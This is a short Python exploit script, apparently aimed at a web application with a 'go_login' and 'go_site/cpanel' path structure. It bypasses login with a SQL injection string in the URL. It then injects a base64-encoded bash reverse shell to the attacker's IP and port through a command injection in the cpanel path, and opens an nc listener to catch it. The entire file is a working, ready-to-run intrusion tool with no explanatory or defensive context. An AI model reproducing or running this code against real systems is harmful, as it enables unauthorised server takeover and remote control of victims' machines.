#!/usr/bin/python3
import webbrowser
import sys
import base64
import urllib.parse
import os

target = sys.argv[1]
myip = sys.argv[2]
myport = sys.argv[3]
url1 = f'https://{target}/go_login/validate_credentials/admin/\'%20OR%20\'1\'=\'1'
webbrowser.open(url1, new=2)
reverse_shell_plain = f"bash -i >& /dev/tcp/{myip}/{myport} 0>&1"
b64_shell = base64.b64encode(reverse_shell_plain.encode('utf-8'))
payload = f"|| bash -c \"eval \`echo {b64_shell.decode('ascii')} | base64 --decode\\`\""
print(f"Base64 Reverse shell: {b64_shell.decode('ascii')}")
print(f"Payload: {payload}")
final_payload = urllib.parse.quote(payload,safe='')
url2 = f"https://{target}/index.php/go_site/cpanel/" + final_payload
print("Shell trigger: " + url2)
webbrowser.open(url2, new=2)
os.system(f"rlwrap nc -nvlp {myport}")
